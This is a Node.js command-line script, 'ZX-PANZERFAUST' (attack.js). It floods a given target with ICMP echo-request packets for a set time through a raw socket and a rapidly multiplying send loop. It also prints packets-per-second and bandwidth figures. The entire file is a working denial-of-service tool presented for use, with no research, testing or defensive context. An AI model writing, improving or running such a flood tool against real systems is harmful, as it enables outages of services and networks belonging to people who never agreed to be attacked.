const raw = require('raw-socket');
const process = require('process');

const [target, time] = process.argv.slice(2);
if (!target || !time) {
    console.log("Usage: node attack.js <target> <time>");
    process.exit(1);
}

process.stdout.write('\x1Bc');

const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

let pings = 0;
let packets = 0;
let lastPings = 0;
let lastPackets = 0;
let maxPPS = 0;
let maxBandwidth = 0;
let accepted = 0;
let denied = 0;
let deniedButAccepted = 0;

const packetSize = 64; // in bytes
const endTime = Date.now() + (parseInt(time) * 1000);

const createPacket = () => {
    const buffer = Buffer.alloc(packetSize);
    buffer.writeUInt8(8, 0);  // ICMP Echo Request
    buffer.writeUInt8(0, 1);  // Code
    buffer.writeUInt16BE(0, 2); // Checksum placeholder
    buffer.writeUInt16BE(process.pid & 0xffff, 4);  // ID
    buffer.writeUInt16BE(pings & 0xffff, 6);  // Seq num
    for (let i = 8; i < packetSize; i++) buffer[i] = i % 255;

    let sum = 0;
    for (let i = 0; i < buffer.length; i += 2) sum += buffer.readUInt16BE(i);
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    const checksum = ~sum & 0xffff;
    buffer.writeUInt16BE(checksum, 2);
    return buffer;
};

const blast = () => {
    if (Date.now() > endTime) {
        const status = maxPPS > 0 ? (
            maxPPS > 10000 ? "ACCEPTED" :
            maxPPS > 1000 ? "ACCEPTED BUT DENIED" :
            "DENIED"
        ) : "DENIED";

        process.stdout.write(`\nZX-PANZERFAUST DONE\n\n`);
        process.stdout.write(`pings: ${pings}\npackets: ${packets}\n`);
        process.stdout.write(`\nACCEPTED: ${status === "ACCEPTED" ? "YES" : "NO"}`);
        process.stdout.write(`\nDENIED: ${status === "DENIED" ? "YES" : "NO"}`);
        process.stdout.write(`\nACCEPTED BUT DENIED: ${status === "ACCEPTED BUT DENIED" ? "YES" : "NO"}`);
        process.stdout.write(`\n\nMAX PPS: ${maxPPS}`);
        process.stdout.write(`\nMAX Bandwidth/s: ${maxBandwidth.toFixed(2)} KB`);
        process.exit(0);
    }

    try {
        const packet = createPacket();
        socket.send(packet, 0, packet.length, target, () => {});
        pings++;
        packets++;
    } catch (e) {
        denied++;
    }

    // Stack the loop tighter
    for (let i = 0; i < 10; i++) {
        setImmediate(blast);
    }
};

// Refresh every 3-5s randomly
const refreshStats = () => {
    const pps = pings - lastPings;
    const pktps = packets - lastPackets;
    const bandwidth = pktps * packetSize / 1024; // KB/sec

    lastPings = pings;
    lastPackets = packets;

    if (pps > maxPPS) maxPPS = pps;
    if (bandwidth > maxBandwidth) maxBandwidth = bandwidth;

    process.stdout.write(`\x1BcZX-PANZERFAUST\n`);
    process.stdout.write(`pings: ${pings}\npackets: ${packets}\n`);
    process.stdout.write(`bandwidth: ${(packets * packetSize / 1024 / ((Date.now() - (endTime - time * 1000)) / 1000)).toFixed(2)} KB\n`);
    process.stdout.write(`pings per second: ${pps}\npackets per second: ${pktps}\n`);
    process.stdout.write(`bandwidth per second: ${bandwidth.toFixed(2)} KB\n`);

    setTimeout(refreshStats, 3000 + Math.floor(Math.random() * 2000));
};

refreshStats();
blast();
